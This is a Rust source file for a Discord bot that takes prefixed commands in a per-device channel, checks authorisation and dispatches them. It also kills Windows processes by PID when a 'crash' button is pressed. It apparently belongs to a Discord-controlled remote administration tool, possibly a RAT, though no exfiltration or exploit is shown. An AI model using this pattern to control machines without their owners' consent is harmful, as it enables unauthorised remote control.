use std::sync::Arc;
use tracing::error;
use twilight_http::Client as HttpClient;
use twilight_model::channel::message::Message;
use twilight_model::id::marker::ChannelMarker;
use twilight_model::id::Id;

use crate::command_registry::get_registry;
use crate::commands::Arguments;
use crate::config::Config;

pub async fn handle_message(
    http: &Arc<HttpClient>,
    msg: Message,
    device_channel_id: Id<ChannelMarker>,
) -> anyhow::Result<()> {
    if msg.channel_id != device_channel_id { return Ok(()); }

    if let Some(content) = msg.content.strip_prefix(Config::BOT_PREFIX) {
        let mut parts = content.split_whitespace();
        let command_name = parts.next().unwrap_or("");
        
        let args = if command_name == "zip" {
            content.trim_start_matches(command_name).trim().to_string()
        } else { parts.collect::<Vec<_>>().join(" ") };

        let registry = get_registry();
        
        if registry.command_exists(command_name) {
            if let Err(auth_error) = crate::core::auth::require_auth(http, &msg).await {
                let response = auth_error.to_string();
                http.create_message(msg.channel_id)
                    .content(&response)
                    .await?;
                return Ok(());
            }

            let args_obj = Arguments::new(&args);
            if let Err(e) = registry
                .execute_command(command_name, http, &msg, args_obj)
                .await
            {
                if Config::SHOW_CONSOLE {
                    error!("Error executing command {}: {}", command_name, e);
                }

                let response = format!(
                    "ERROR: An error occurred while executing `{}{}`",
                    Config::BOT_PREFIX,
                    command_name
                );

                http.create_message(msg.channel_id)
                    .content(&response)
                    .await?;
            }
        } else {
            let response = format!(
                "ERROR: Unknown command: `{}`. Use `{}help` to see available commands.",
                command_name,
                Config::BOT_PREFIX
            );

            http.create_message(msg.channel_id)
                .content(&response)
                .await?;
        }
    }
    
    Ok(())
}

//@ Handle Discord
pub async fn handle_interaction(
    http: &Arc<HttpClient>,
    interaction: twilight_model::application::interaction::Interaction,
) -> anyhow::Result<()> {
    use twilight_model::application::interaction::InteractionData;
    use twilight_model::http::interaction::{
        InteractionResponse, InteractionResponseData, InteractionResponseType,
    };

    if let Some(InteractionData::MessageComponent(data)) = &interaction.data {
        let custom_id = &data.custom_id;

        // Handle crash button interactions
        if custom_id.starts_with("crash_") {
            if let Some(pid_str) = custom_id.strip_prefix("crash_") {
                if let Ok(pid) = pid_str.parse::<u32>() {
                    let response_content = terminate_process(pid);

                    http.interaction(interaction.application_id)
                        .create_response(
                            interaction.id,
                            &interaction.token,
                            &InteractionResponse {
                                kind: InteractionResponseType::ChannelMessageWithSource,
                                data: Some(InteractionResponseData {
                                    content: Some(response_content),
                                    ..Default::default()
                                }),
                            },
                        )
                        .await?;
                }
            }
        }
    }

    Ok(())
}

//@ Terminate a process by PID
fn terminate_process(pid: u32) -> String {
    use winapi::um::handleapi::CloseHandle;
    use winapi::um::processthreadsapi::{OpenProcess, TerminateProcess};
    use winapi::um::winnt::PROCESS_TERMINATE;

    unsafe {
        let handle = OpenProcess(PROCESS_TERMINATE, 0, pid);
        if !handle.is_null() {
            let result = TerminateProcess(handle, 1);
            CloseHandle(handle);

            if result != 0 {
                format!("Successfully crashed process (PID: {})", pid)
            } else {
                format!("Failed to crash process (PID: {})", pid)
            }
        } else {
            format!("Failed to open process (PID: {})", pid)
        }
    }
}
